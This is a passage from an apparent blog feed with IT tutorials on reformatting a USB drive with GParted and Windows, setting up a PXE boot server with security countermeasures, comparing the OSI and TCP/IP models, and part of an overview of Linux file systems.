</code></pre><p>This will bring GParted interface, you can use the dropdown menu in the top-right corner to switch between your different drives. The USB drive will often be named <code>/dev/sdb</code>, or a similar identifier. You can also identify your storage device by the space in GiB.</p>
<p><img src="/images/gparted1.png" alt="GParted Interface"></p>
<p><strong>2. Delete the existing partitions listed on the USB drive</strong></p>
<p>Right-click on each existing partition listed on the USB drive and select &ldquo;Delete.&rdquo; Confirm any prompts. I only have one partition listed for me as <code>/dev/sdb1</code>. If the &ldquo;Delete&rdquo; option is greyed out it means that you have to unmount the device first. Go to your file explorer right-click on your device and select &ldquo;Unmount&rdquo;.</p>
<p><strong>3. Create a New Partition Table</strong></p>
<p>After deleting all partitions, click on the &ldquo;Device&rdquo; menu and select &ldquo;Create Partition Table.&rdquo;
Then choose the type of partition table you want to create (usually &ldquo;msdos&rdquo; for MBR or &ldquo;gpt&rdquo; for GPT) and click &ldquo;Apply.&rdquo; (msdos will work just fine)</p>
<p><img src="/images/gparted2.png" alt="GParted Create New Partition Table"></p>
<p><strong>4. Create a New Partition</strong></p>
<p>Now, create a new partition on the unallocated space. Right-click on the unallocated space, choose &ldquo;New,&rdquo; set the desired file system, and click &ldquo;Add.&rdquo; Click on the green check button to &ldquo;Apply All Operations&rdquo;. You have to use the green check button everytime you see &ldquo;1 operation pending&rdquo; at the bottom of the screen.</p>
<p><img src="/images/gparted3.png" alt="GParted Create a New Partition"></p>
<p><strong>5. Formatting successful</strong></p>
<p>You should see a screen saying that All Operations were successful. But there is more that you can do.</p>
<p><img src="/images/gparted4.png" alt="GParted Operation Successful"></p>
<p><strong>6. File system configuration</strong></p>
<p>In my case I have two laptops (Windows and Linux) and in order for storage devices to work on both systems you have to use a compatible file system type. I recommend to format your device to <code>exFAT</code> if you want to use it on Windows and Linux. If you plan on using it exclusively on Linux system choose <code>ext4</code> and for Windows systems <code>NTFS</code>.</p>
<p>Righ-click on the partition and hover over <code>Format to</code>, you will get a list of file systems, select <code>exfat</code> and press the green check button to continue. Close all the window after the operations are done and you should see that under the <code>File System</code> section the device now uses <code>exfat</code>.</p>
<p><img src="/images/gparted5.png" alt="GParted Operation Successful"></p>
<p><img src="/images/gparted6.png" alt="GParted Operation Successful"></p>
<p>Your USB device is now ready for use.</p>
<p><strong>7. Device not showing in file explorer on Windows systems</strong></p>
<p>It may happen that despite the USB stick being recognized on a Windows system, it does not appear in the file explorer with other drives such as (C:) and (D:). This happens because the device does not have a drive letter assigned. You can fix it by using the Disk Management application on Windows.</p>
<ul>
<li>Right-click on the Start menu and select &ldquo;Disk Management&rdquo; from the context menu.</li>
</ul>
<p><img src="/images/Disk-Management-1.png" alt="GParted Operation Successful"></p>
<ul>
<li>
<p>In the Disk Management window, you should see a list of drives. Look for your USB drive, which may be labeled as &ldquo;Removable&rdquo; or &ldquo;Unknown.&rdquo;</p>
</li>
<li>
<p>Right-click on the USB drive and select &ldquo;Change Drive Letter and Paths.&rdquo; and Click &ldquo;Add.&rdquo; (It is better to leave some free letters for the computer drives, so choose F: or something further than that).</p>
</li>
</ul>
<p><img src="/images/Disk-Management-2.png" alt="GParted Operation Successful"></p>
<ul>
<li>Choose a drive letter from the list and click &ldquo;OK.</li>
</ul>
<p>After assigning a drive letter, your USB drive should now appear in File Explorer on your Windows computer.</p>
<p><img src="/images/File-Explorer.png" alt="GParted Operation Successful"></p>
<h2 id="windows-method">Windows Method</h2>
<ol>
<li>
<p>Plug the bootable USB drive into a USB port on your Windows computer.</p>
</li>
<li>
<p>Press Win + E to open File Explorer.</p>
</li>
<li>
<p>Right-click on the USB drive and select &ldquo;Format&hellip;&rdquo; from the context menu.</p>
</li>
<li>
<p>In the Format dialog box, you can choose the desired file system. For compatibility between Windows and other operating systems like Linux, you can choose exFAT. If you only plan to use the USB drive with Windows, you can choose NTFS. You can also set a volume label if desired.</p>
</li>
</ol>
<p><img src="/images/Windows-formatting.png" alt="GParted Operation Successful"></p>
<ol start="5">
<li>
<p>Click on the &ldquo;Start&rdquo; button to begin the formatting process.</p>
</li>
<li>
<p>If prompted to confirm, click &ldquo;OK&rdquo; to proceed. Note that formatting will erase all data on the USB drive, so make sure to back up any important files before proceeding.</p>
</li>
<li>
<p>Wait for Windows to complete the formatting process. This may take a few moments, depending on the size of the USB drive.</p>
</li>
</ol>
<p><img src="/images/Windows-formatting-2.png" alt="GParted Operation Successful"></p>
<ol start="8">
<li>Once the formatting process is complete, safely eject the USB drive from your computer to ensure that all changes are finalized and the drive is safe to remove.</li>
</ol>
<p>After completing these steps, your bootable USB drive should be reverted back to a normal USB stick, and you can use it for regular storage purposes.</p>
]]></content>
        </item>
        
        <item>
            <title>Streamlining IT Operations: A Guide to PXE Server Setup and Security</title>
            <link>https://scorpiosec.com/posts/2024/02/streamlining-it-operations-a-guide-to-pxe-server-setup-and-security/</link>
            <pubDate>Sun, 04 Feb 2024 15:42:38 -0600</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/02/streamlining-it-operations-a-guide-to-pxe-server-setup-and-security/</guid>
            <description>Introduction Have you ever wondered how OS installations or system maintenance are handled in large IT infrastructure? Picture this: you work in the IT department and are tasked with preparing laptops for new hires. These individuals will be working in different departments, each requiring a specific OS. How would you approach this task? Would you physically interact with each laptop to complete the process? Now, imagine it&amp;rsquo;s not just 10, 20, or 30 laptops but also servers, switches, routers, virtual machines, and more.</description>
            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p>Have you ever wondered how OS installations or system maintenance are handled in large IT infrastructure? Picture this: you work in the IT department and are tasked with preparing laptops for new hires. These individuals will be working in different departments, each requiring a specific OS. How would you approach this task? Would you physically interact with each laptop to complete the process? Now, imagine it&rsquo;s not just 10, 20, or 30 laptops but also servers, switches, routers, virtual machines, and more. The complexity becomes evident.</p>
<p>Enter PXE! PXE, or Preboot Execution Environment, is a standard that enables a computer to boot and load its operating system from a server on a network. Widely used in large-scale IT environments, PXE simplifies tasks such as operating system deployment, system recovery, and network-based installations. By allowing a computer to obtain its network configuration and necessary files, PXE initiates the boot process without relying on local storage devices.</p>
<p><img src="/images/PXE-server-topology.png" alt="PXE server diagram">
<em>Credits for the image CC(ChenChih) on medium.com</em></p>
<h2 id="pxe-server-setup">PXE Server Setup</h2>
<p>PXE is a game-changer for bulk computer setups, eliminating the need for individual CDs or USB drives by enabling the installation of a single operating system image on multiple machines simultaneously, saving you time and effort. It relies on a DHCP server, a TFTP server, and a web server. DHCP assigns an IP address to the computer and provides information about the PXE server, including the location of the TFTP (Trivial File Transfer Protocol) server for transferring PXE boot files to clients during the boot process.</p>
<p>While a web server is not strictly necessary for basic PXE functionality, it becomes essential when dealing with more advanced PXE setups and deploying operating systems that rely on retrieving files over HTTP during the installation process. The web server is primarily used to store installation files, significantly enhancing the capabilities of your PXE server.</p>
<p>For many operating systems, especially modern versions of Windows and various Linux distributions, the installation files are too large to be transferred via TFTP alone. A web server is used to store these large files, making them accessible to PXE clients during the installation process. Now, let&rsquo;s delve into the practical aspects of setting up a PXE server.</p>
<h3 id="prerequisites">Prerequisites</h3>
<p>First, ensure you have the following prerequisites in place:</p>
<ol>
<li>Server Infrastructure:</li>
</ol>
<ul>
<li>A dedicated server or virtual machine that will serve as the PXE server.</li>
</ul>
<ol start="2">
<li>Operating System:</li>
</ol>
<ul>
<li>Choose a Linux distribution for the PXE server. Popular choices include Ubuntu Server, CentOS, or Debian.</li>
</ul>
<ol start="3">
<li>Network Configuration:</li>
</ol>
<ul>
<li>Ensure a stable network with DHCP configured to allocate IP addresses to PXE clients.</li>
<li>Establish an isolated network segment or VLAN dedicated to PXE-related traffic to enhance security.</li>
</ul>
<h3 id="steps-to-set-up-a-pxe-server">Steps to Set Up a PXE Server</h3>
<ol>
<li>DHCP Server: Install and configure a DHCP server to provide IP addresses to PXE clients. Ensure DHCP options are set to indicate the location of the PXE server and boot files.</li>
</ol>
<pre tabindex="0"><code>sudo apt-get install isc-dhcp-server
</code></pre><ol start="2">
<li>TFTP Server: Install a TFTP server to transfer PXE boot files to clients during the boot process.</li>
</ol>
<pre tabindex="0"><code>sudo apt-get install tftpd-hpa
</code></pre><ol start="3">
<li>Web Server: Set up a web server to host installation files for various operating systems.</li>
</ol>
<pre tabindex="0"><code>sudo apt-get install apache2
</code></pre><ol start="4">
<li>Configure the DHCP Server: Edit the DHCP server configuration file to include PXE-specific settings. For example, in the /etc/dhcp/dhcpd.conf file:</li>
</ol>
<pre tabindex="0"><code>option domain-name &#34;example.com&#34;;
option domain-name-servers ns1.example.com, ns2.example.com;

subnet 192.168.1.0 netmask 255.255.255.0 {
  range 192.168.1.100 192.168.1.200;
  option routers 192.168.1.1;
  option broadcast-address 192.168.1.255;
  option subnet-mask 255.255.255.0;
  filename &#34;pxelinux.0&#34;;
  next-server 192.168.1.10; # PXE Server IP
}
</code></pre><ol start="5">
<li>Configure the TFTP Server: Edit the TFTP server configuration file (usually located at /etc/default/tftpd-hpa) to define the TFTP root directory:</li>
</ol>
<pre tabindex="0"><code>TFTP_USERNAME=&#34;tftp&#34;
TFTP_DIRECTORY=&#34;/var/lib/tftpboot&#34;
TFTP_ADDRESS=&#34;0.0.0.0:69&#34;
TFTP_OPTIONS=&#34;--secure&#34;
</code></pre><ol start="6">
<li>Prepare PXE Boot Files: Download PXE boot files, such as PXELinux, from the official website or package repositories. Place these files in the TFTP root directory (/var/lib/tftpboot).</li>
</ol>
<pre tabindex="0"><code>sudo mkdir /var/lib/tftpboot
sudo wget https://www.syslinux.org/wiki/uploads/attachments/syslinux-6.04-pre1.tar.xz
sudo tar -xvf syslinux-6.04-pre1.tar.xz
sudo cp syslinux-6.04-pre1/bios/core/pxelinux.0 /var/lib/tftpboot
sudo cp syslinux-6.04-pre1/bios/com32/elflink/ldlinux/ldlinux.c32 /var/lib/tftpboot
sudo cp syslinux-6.04-pre1/bios/com32/lib/libcom32.c32 /var/lib/tftpboot
sudo cp syslinux-6.04-pre1/bios/com32/libutil/libutil.c32 /var/lib/tftpboot
</code></pre><ol start="7">
<li>
<p>Configure Web Server: Copy the installation files for the desired operating systems (Windows, Linux distributions) to the web server root directory (e.g., /var/www/html for Apache).</p>
</li>
<li>
<p>Test PXE Boot:</p>
</li>
</ol>
<ul>
<li>Start the DHCP and TFTP services:</li>
</ul>
<pre tabindex="0"><code>sudo systemctl restart isc-dhcp-server
sudo systemctl restart tftpd-hpa
</code></pre><ul>
<li>Ensure the web server is running:</li>
</ul>
<pre tabindex="0"><code>sudo systemctl restart apache2
</code></pre><ul>
<li>Boot a PXE-enabled client device and verify that it successfully initiates the PXE boot process.</li>
</ul>
<p>With these steps, you&rsquo;ve transformed a standard server into a PXE powerhouse, ready to deploy operating systems seamlessly across your network.</p>
<h2 id="security-considerations">Security Considerations</h2>
<h3 id="vulnerabilities">Vulnerabilities</h3>
<p>While PXE is a convenient and efficient technology, like any networked system, it comes with potential vulnerabilities. Here are some concerns and corresponding countermeasures:</p>
<ul>
<li>
<p>Unauthorized Access: Malicious actors could attempt to gain unauthorized access to the PXE server, potentially injecting or altering boot files to compromise the integrity of the operating system installations.</p>
</li>
<li>
<p>Man-in-the-Middle Attacks: Attackers might intercept communication between the PXE server and client machines, allowing them to manipulate or eavesdrop on the installation process.</p>
</li>
<li>
<p>DHCP Spoofing: If an attacker successfully spoofs the DHCP responses, they could redirect PXE clients to a rogue PXE server, leading to unauthorized OS installations or potential exploitation.</p>
</li>
</ul>
<blockquote>
<p>If you want to read about a real world PXE vulnerability, check <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-3284" target="_blank" >CVE-2020-3284</a>

</p>
</blockquote>
<h3 id="countermeasures">Countermeasures</h3>
<ul>
<li>
<p>Secure the PXE Server: Implement robust authentication and access controls for the PXE server. Regularly update and patch the server&rsquo;s operating system and software to address known vulnerabilities.</p>
</li>
<li>
<p>Encryption: Utilize encryption protocols (such as HTTPS) to secure communication between the PXE server and clients. This safeguards against man-in-the-middle attacks and ensures the integrity of the boot files.</p>
</li>
<li>
<p>Network Segmentation: Employ network segmentation to isolate the PXE server from untrusted networks. This strategy limits the potential attack surface, reducing the risk of unauthorized access.</p>
</li>
<li>
<p>Digital Signatures: Sign boot files with digital signatures to verify their authenticity. Permit the installation of only signed and verified operating system images, thus mitigating the risk of injected or altered files.</p>
</li>
<li>
<p>DHCP Security: Implement DHCP snooping and Dynamic ARP Inspection (DAI) to prevent DHCP spoofing attacks. This measure ensures that PXE clients receive valid DHCP responses from legitimate servers.</p>
</li>
<li>
<p>Monitoring and Logging: Regularly monitor and log PXE server activities to detect unusual or suspicious behavior, providing early indicators of potential security incidents.</p>
</li>
<li>
<p>Firmware/BIOS Passwords: Set strong passwords for the firmware/BIOS settings to prevent unauthorized changes. This step helps protect against tampering with PXE boot settings on individual machines.</p>
</li>
</ul>
<p>By implementing these countermeasures, you can enhance the security of your PXE deployment and reduce the risk of exploitation by malicious actors. If you&rsquo;re interested in more details on security measures, Microsoft provides a set of best practices available <a href="https://learn.microsoft.com/en-us/mem/configmgr/osd/plan-design/security-and-privacy-for-operating-system-deployment" target="_blank" >here</a>

.</p>
<h2 id="automation">Automation</h2>
<p>A web server enables you to host customized scripts, kickstart files, preseed files, or other configuration files that automate the installation process. This capability is particularly valuable for unattended installations and customization.</p>
<p>Answer files for Windows and preseed files for Ubuntu are configuration files employed in unattended installations. These files contain settings and parameters that automate the installation process, eliminating the need for user interaction during the installation of the operating system.</p>
<h3 id="answer-files-for-windows">Answer Files for Windows</h3>
<ol>
<li>Unattend.xml (Windows Vista and later):</li>
</ol>
<ul>
<li>For Windows Vista and subsequent versions, including Windows Server editions, the unattended installation is typically controlled by an XML-based file called Unattend.xml.</li>
<li>This file contains settings such as the product key, time zone, user accounts, and more.</li>
</ul>
<ol start="2">
<li>
<p>Sysprep:
Before capturing an image for deployment, you often use the System Preparation (Sysprep) tool to generalize the Windows installation. During Sysprep, you can specify an answer file that will be used during the next boot to configure the system.</p>
</li>
<li>
<p>Deployment Tools Command Prompt:</p>
</li>
</ol>
<ul>
<li>Utilize the Deployment Tools Command Prompt (part of the Windows Assessment and Deployment Kit - ADK) to generate and work with answer files.</li>
<li>Common tools include Windows SIM (System Image Manager) for creating and modifying answer files.</li>
</ul>
<h3 id="preseed-files-for-ubuntu">Preseed Files for Ubuntu</h3>
<ol>
<li>Preseed Configuration File:</li>
</ol>
<ul>
<li>For Ubuntu and Debian-based systems, the preseed file is used to automate the installation process.</li>
<li>The file is typically named preseed.cfg or a similar name and contains instructions on partitioning, package selection, user creation, and other installation options.</li>
</ul>
<ol start="2">
<li>Location of Preseed File:</li>
</ol>
<ul>
<li>During the PXE boot process, the installer looks for the preseed file in a specific location. For example, it might be located at <a href="http://example.com/preseed.cfg" target="_blank" >http://example.com/preseed.cfg</a>

 on a web server.</li>
</ul>
<ol start="3">
<li>DHCP Configuration:</li>
</ol>
<ul>
<li>Your PXE server&rsquo;s DHCP configuration should include an option to specify the location of the preseed file. For example, in the DHCP configuration, you might set:</li>
</ul>
<pre tabindex="0"><code>option preseed-url &#34;http://example.com/preseed.cfg&#34;;
</code></pre><h3 id="using-answer-files-and-preseed-files-with-pxe">Using Answer Files and Preseed Files with PXE</h3>
<ol>
<li>
<p>Create Answer/Preseed Files: Use tools like Windows SIM for Windows or manually create a preseed file for Ubuntu. These files define the configuration options for the unattended installation.</p>
</li>
<li>
<p>Place Files on Web Server: Host the answer file (e.g., Unattend.xml for Windows or preseed.cfg for Ubuntu) on a web server accessible to PXE clients.</p>
</li>
<li>
<p>Configure PXE Server: Modify your PXE server configuration to include the URL or path to the answer file or preseed file. This is typically done in the PXE server&rsquo;s configuration file or DHCP options. For example, in a PXE configuration file, you might specify the location of the Windows answer file like this:</p>
</li>
</ol>
<pre tabindex="0"><code>APPEND  ... inst.ks=http://example.com/Unattend.xml
</code></pre><ul>
<li>In DHCP configuration, you might specify the location of the Ubuntu preseed file:</li>
</ul>
<pre tabindex="0"><code>option preseed-url &#34;http://example.com/preseed.cfg&#34;;
</code></pre><ol start="4">
<li>Test the Installation:</li>
</ol>
<ul>
<li>Boot a client machine via PXE and observe the automated installation process. The installer will fetch the answer file or preseed file from the specified location and use it to configure the installation settings.</li>
</ul>
<p>Using answer files or preseed files with PXE allows for efficient and automated deployment of operating systems.</p>
<h2 id="conclusion">Conclusion</h2>
<p>In conclusion, PXE stands as a testament to the evolution of IT solutions, offering a powerful tool for administrators tasked with managing diverse and extensive computing environments. It streamlines the deployment and maintenance of operating systems in a world where adaptability is key. PXE is utilized for various purposes, including operating system deployment, system recovery, maintenance, automated deployments, and imaging. I hope I have provided a comprehensive overview of this technology. I plan to build a project around it in my homelab. After creating a PXE server network and deploying several operating systems on virtual machines, I will attempt to assess the network&rsquo;s vulnerabilities and then apply countermeasures to enhance the server&rsquo;s security. Stay tuned and keep learning!</p>
]]></content>
        </item>
        
        <item>
            <title>Comparing the Building Blocks: OSI Model vs. TCP/IP Model</title>
            <link>https://scorpiosec.com/posts/2024/01/comparing-the-building-blocks-osi-model-vs.-tcp/ip-model/</link>
            <pubDate>Sun, 28 Jan 2024 14:23:09 -0600</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/01/comparing-the-building-blocks-osi-model-vs.-tcp/ip-model/</guid>
            <description>Introduction Networking – a skill that resonates loudly in the realm of technical IT roles. It&amp;rsquo;s a non-negotiable proficiency for anyone navigating the intricate landscapes of information technology. At the heart of this expertise are two pivotal models: the Open Systems Interconnection (OSI) model and the Transmission Control Protocol/Internet Protocol (TCP/IP) model. Serving as foundational blueprints, these models play a crucial role in designing, implementing, and troubleshooting networks. They offer a conceptual framework that streamlines communication between devices.</description>
            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p>Networking – a skill that resonates loudly in the realm of technical IT roles. It&rsquo;s a non-negotiable proficiency for anyone navigating the intricate landscapes of information technology. At the heart of this expertise are two pivotal models: the Open Systems Interconnection (OSI) model and the Transmission Control Protocol/Internet Protocol (TCP/IP) model. Serving as foundational blueprints, these models play a crucial role in designing, implementing, and troubleshooting networks. They offer a conceptual framework that streamlines communication between devices. This blog post aims to dissect both models, exploring their different layers.</p>
<h2 id="osi-model">OSI Model</h2>
<p><img src="/images/OSI-7-layers.jpg" alt="OSI Model"></p>
<p>The Open Systems Interconnection (OSI) model stands as a foundational framework for understanding and conceptualizing network communication. Introduced by the International Organization for Standardization (ISO), the OSI model is structured into seven distinct layers, each serving a specific purpose in the transmission of data.</p>
<ol>
<li><strong>Physical Layer</strong></li>
</ol>
<p>At the base of the OSI model lies the Physical Layer, where the tangible elements of network communication come into play. Cables, connectors, and hardware components are the focus here, determining how bits are transmitted over various media.</p>
<ol start="2">
<li><strong>Data Link Layer</strong></li>
</ol>
<p>Moving up, the Data Link Layer provides a mechanism for error detection and correction within the physical layer. This layer is responsible for organizing bits into frames and ensuring reliable point-to-point communication between devices on the same network. Here you will find protocols and technologies such as Ethernet, MAC/LLC, VLAN etc.</p>
<ol start="3">
<li><strong>Network Layer</strong></li>
</ol>
<p>The Network Layer introduces the concept of logical addressing, such as IP addresses. It manages the routing of data packets between devices on different networks, enabling communication across diverse systems. Devices on this layer use Internet Protocol (IP), Internet Protocol Security (IPsec) and more.</p>
<ol start="4">
<li><strong>Transport Layer</strong></li>
</ol>
<p>The Transport Layer ensures end-to-end communication reliability. It segments and reassembles data into manageable chunks, addressing issues such as flow control, error recovery, and acknowledgment of received data. Protocols at this layer are responsible for moving data between devices. The most common protocols here are Transmission Control Protocol (TCP) and User Datagram Protocol (UDP).</p>
<ol start="5">
<li><strong>Session Layer</strong></li>
</ol>
<p>To establish communication between two devices, an application must initiate a session, a unique entity linked to the user and identifier on the remote server.</p>
<p>The duration of the session must be long enough to allow data transfer, but it must be closed once the transfer is complete. When large volumes of data are being transferred, the session is responsible for ensuring that the file is transferred in its entirety, and for re-establishing transmission in the event of incomplete data.</p>
<p>For example, if 10 MB of data are being transferred and only 5 MB are complete, the session layer ensures that only the complete 5 MB are retransmitted. This approach to transfer optimizes communication efficiency on the network, avoiding wasted resources and limiting retransmission to the necessary part of the file.</p>
<ol start="6">
<li><strong>Presentation Layer</strong></li>
</ol>
<p>The presentation layer prepares data for display. Two different applications often use different encodings.</p>
<p>For example, when communicating with a web server via HTTPS, information is encrypted. The presentation layer is responsible for encoding and decoding the information so that it can be read. In addition, the presentation layer handles the compression and decompression of data as it is transferred from one device to another.</p>
<ol start="7">
<li><strong>Application Layer</strong></li>
</ol>
<p>At the top of the OSI model is the Application Layer, the interface between the network and the user. This layer facilitates communication between software applications, allowing users to interact with network services. Most people are familiar with some technologies of this layer such as Hypertext Transfer Protocol (HTTP), Simple Mail Transfer Protocol (SMTP) and The Domain Name System (DNS).</p>
<blockquote>
<p>One of the distinctive features of the OSI model is its hierarchical nature. Each layer builds upon the functionalities of the layers beneath it, creating a structured and modular approach to network design. This organization allows for flexibility and scalability, making it a valuable reference for network architects and administrators. The OSI model provides a universal structure for understanding and building network communication systems, independent of specific protocols or technologies.</p>
</blockquote>
<h2 id="tcpip-model">TCP/IP Model</h2>
<p><img src="/images/The-TCP-IP-five-layer-model.png" alt="TCP/IP Model Model"></p>
<p>While the OSI model provides a comprehensive framework for understanding networking, the Transmission Control Protocol/Internet Protocol (TCP/IP) model has emerged as the de facto standard for the design and implementation of the internet. Originating from the development of the ARPANET, the TCP/IP model is renowned for its simplicity and effectiveness. Unlike the OSI model&rsquo;s seven layers, the TCP/IP model condenses the network communication process into five layers, offering a streamlined and practical approach.</p>
<ol>
<li><strong>Physical Layer</strong></li>
</ol>
<p>In the TCP/IP model, the Physical Layer encompasses the same functions as the corresponding layer in the OSI model. It deals with the physical connection between devices, specifying details such as cable types, connectors, and hardware interfaces.</p>
<ol start="2">
<li><strong>Data Link Layer</strong></li>
</ol>
<p>The TCP/IP Data Link Layer ensures error-free communication between devices on the same local network, using protocols like Ethernet, MAC, and LLC. It plays a crucial role in framing data, detecting errors, and managing device addressing for efficient local network communication.</p>
<ol start="3">
<li><strong>Network Layer</strong></li>
</ol>
<p>Similar to the OSI model, the TCP/IP model&rsquo;s Network Layer handles logical addressing and routing. Here, the Internet Protocol (IP) comes into play, managing the delivery of data packets across different networks.</p>
<ol start="4">
<li><strong>Transport Layer</strong></li>
</ol>
<p>The Transport Layer in the TCP/IP model closely resembles its counterpart in the OSI model. It is responsible for end-to-end communication and ensures the reliable and orderly delivery of data between devices. The Transmission Control Protocol (TCP) and User Datagram Protocol (UDP) operate at this layer.</p>
<ol start="5">
<li><strong>Application Layer</strong></li>
</ol>
<p>At the top of the TCP/IP model is the Application Layer, encompassing functionalities from the OSI model&rsquo;s top three layers (Session, Presentation and Application). This layer serves as the interface between network services and end-user applications, handling communication between software and the lower layers.</p>
<blockquote>
<p>One of the key strengths of the TCP/IP model lies in its practicality and simplicity. By consolidating the OSI model&rsquo;s seven layers into five, the TCP/IP model streamlines the networking architecture, making it more intuitive for real-world implementation. This adaptability has contributed to the widespread adoption of the TCP/IP model as the foundation of the modern internet.</p>
</blockquote>
<h2 id="osi-vs-tcpip">OSI vs. TCP/IP</h2>
<p><img src="/images/Network-Models.png" alt="OSI vs TCP/IP Model"></p>
<h3 id="osi">OSI</h3>
<ul>
<li>
<p>The OSI model, with its detailed layering, proves invaluable in the initial stages of network design. Architects can use this model as a blueprint to organize and structure the various components of a network. Moreover, the OSI model is designed to be protocol-independent,  meaning it can be applied to any network technology.</p>
</li>
<li>
<p>The OSI model is widely utilized in educational settings to teach the fundamentals of networking. Its seven layers provide a comprehensive framework for students to grasp the intricacies of network communication. However, its theoretical nature can be perceived as complex in real-world applications.</p>
</li>
<li>
<p>One of the key strengths of the OSI model lies in its ability to compartmentalize network functionality into distinct layers. When troubleshooting, this layering proves invaluable. By isolating problems to specific layers, IT professionals can pinpoint the source of issues more efficiently. For example, problems at the Data Link Layer may involve hardware or cabling, while issues at the Transport Layer could relate to protocol or configuration errors.</p>
</li>
</ul>
<h3 id="tcpip">TCP/IP</h3>
<ul>
<li>
<p>The TCP/IP model is the backbone of the internet. Its streamlined structure, comprising five layers, aligns seamlessly with the protocols governing internet communication.</p>
</li>
<li>
<p>Known for its simplicity, the TCP/IP model is favored for real-world implementation. It offers a practical and straightforward approach to networking, making it suitable for a wide range of applications. Its adaptability has led to its widespread adoption in various networking environments.</p>
</li>
<li>
<p>The TCP/IP model is based on specific protocols like TCP and IP, which are dominant in the internet. However, because the model combines many functions in the application layer, troubleshooting at this level might be difficult. If someone thinks that there is an issue at this level it might require some digging because it encapsulates many different protocols and functionalities.</p>
</li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>Both the OSI and TCP/IP models have applications in network design, troubleshooting, and real-world implementation. The OSI model&rsquo;s layering proves advantageous in educational contexts,  while the TCP/IP model&rsquo;s simplicity shines in practical, real-world environments. Each model brings its own set of strengths to the table, and professionals must carefully consider the context, requirements, and goals of their networking endeavors.</p>
<p>As we only scratched the surface of each model and their different layers, I encourage you to continue exploring the dynamic field of networking especially if you aspire to be in a networking role. My go-to resources to refresh and deepen my networking skills are <a href="https://www.amazon.com/TCP-Guide-Comprehensive-Illustrated-Protocols/dp/159327047X#customerReviews" target="_blank" >The TCP/IP Guide: A Comprehensive, Illustrated Internet Protocols Reference</a>

 and <a href="https://www.amazon.com/Attacking-Network-Protocols-Analysis-Exploitation/dp/1593277504" target="_blank" >Attacking Network Protocols: A Hacker&rsquo;s Guide to Capture, Analysis, and Exploitation</a>

.</p>
<p>Thank you for joining me on this educational journey. If you have further questions or if there are specific topics you&rsquo;d like me to cover in the future, feel free to reach out. Until then, keep learning!</p>
]]></content>
        </item>
        
        <item>
            <title>Overview of the Common Linux File System Types</title>
            <link>https://scorpiosec.com/posts/2024/01/overview-of-the-common-linux-file-system-types/</link>
            <pubDate>Sun, 21 Jan 2024 18:33:14 -0600</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/01/overview-of-the-common-linux-file-system-types/</guid>
            <description>Introduction Last week, we explored the organization of files in Linux, but how does the operating system automatically know where to store file &amp;ldquo;X&amp;rdquo; or file &amp;ldquo;Y&amp;rdquo;? The answer lies in the file system type—a crucial blueprint that dictates the organization and storage of data on a computer&amp;rsquo;s storage devices, such as hard drives or solid-state drives. It guides the computer to manage and keep track of files and folders.</description>
            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p>Last week, we explored the organization of files in Linux, but how does the operating system automatically know where to store file &ldquo;X&rdquo; or file &ldquo;Y&rdquo;? The answer lies in the file system type—a crucial blueprint that dictates the organization and storage of data on a computer&rsquo;s storage devices, such as hard drives or solid-state drives. It guides the computer to manage and keep track of files and folders.</p>
<p>To grasp this concept, envision your computer&rsquo;s storage as a closet, where each file system type represents a distinct method of arranging and sorting your clothes—by color, type, and more. Just as each clothing arrangement method has its strengths and limitations, file system types in Linux are tailored to specific purposes. Some specialize in swiftly handling large amounts of data, while others prioritize data integrity and security. Linux supports various file system types like Ext4, XFS, ZFS, etc., each designed with specific purposes in mind. We will look at five of them today.</p>
<h2 id="ext4-fourth-extended-file-system">Ext4 (Fourth Extended File System)</h2>
<p>Ext4, or the Fourth Extended File System, is one of the most widely used file systems in the Linux world. It builds upon its predecessor, Ext3, offering improved performance and additional features. Ext4 is known for its reliability, journaling capabilities, and support for large file systems. Running the command <code>df -T -h</code> on your terminal will let you see the Ext4 file system on your machine.</p>
<table>
<thead>
<tr>
<th><strong>Advantages</strong></th>
<th><strong>Disadvantages</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>High performance for most workloads and backwards compatible with Ext3</td>
<td>May face challenges with extremely large file systems due to scalability issues</td>
</tr>
<tr>
<td>Robust journaling mechanism minimizes data loss from unexpected system failures</td>
<td>Does not support transparent compression</td>
</tr>
<tr>
<td>Supports large file and partition sizes</td>
<td>Does not support data deduplication</td>
</tr>
</tbody>
</table>
<h2 id="xfs-xfs-file-system">XFS (XFS File System)</h2>
<p>XFS, the X File System, is renowned for its scalability and efficient handling of large files and massive storage volumes. Its design focuses on optimizing performance for high-capacity storage, making it suitable for diverse applications with extensive datasets. XFS is ideal for tasks demanding high-performance file I/O operations; it is a popular choice for database systems. Its capabilities shine in scenarios where quick access to vast amounts of data is critical.</p>
<table>
<thead>
<tr>
<th><strong>Advantages</strong></th>
<th><strong>Disadvantages</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>High-performance, scalable file system</td>
<td>Doesn&rsquo;t utilize checksums, which are crucial for verifying data integrity</td>
</tr>
<tr>
<td>No slowdown when dealing with many concurrent I/O operations</td>
<td>While XFS employs journaling for its internal structures, it doesn&rsquo;t log changes to user data itself</td>
</tr>
</tbody>
</table>
<h2 id="zfs-z-file-system">ZFS (Z File System)</h2>
<p>This file system is not native to Linux but has been adapted for Linux environments. The Z File System stands out for its advanced features, including robust data integrity, snapshots, and built-in RAID support. Originally developed by Sun Microsystems, ZFS has found its way into the Linux ecosystem. ZFS offers robust data protection through readily accessible snapshots, optimized data storage via compression, and elimination of redundant data copies.</p>
<table>
<thead>
<tr>
<th><strong>Advantages</strong></th>
<th><strong>Disadvantages</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Leveraging checksums and self-healing mechanisms, this system ensures exceptional data integrity by actively detecting and correcting errors</td>
<td>ZFS is feature-rich, but this complexity can make it more challenging to configure, manage, and troubleshoot compared to simpler file systems</td>
</tr>
<tr>
<td>Excellent storage with data compression and deduplication</td>
<td>ZFS relies heavily on system memory (RAM) to cache data and metadata for optimal performance, insufficient RAM can lead to performance degradation, especially in large storage pools or with intensive workloads</td>
</tr>
</tbody>
</table>
<h2 id="btrfs-b-tree-file-system">Btrfs (B-Tree File System)</h2>
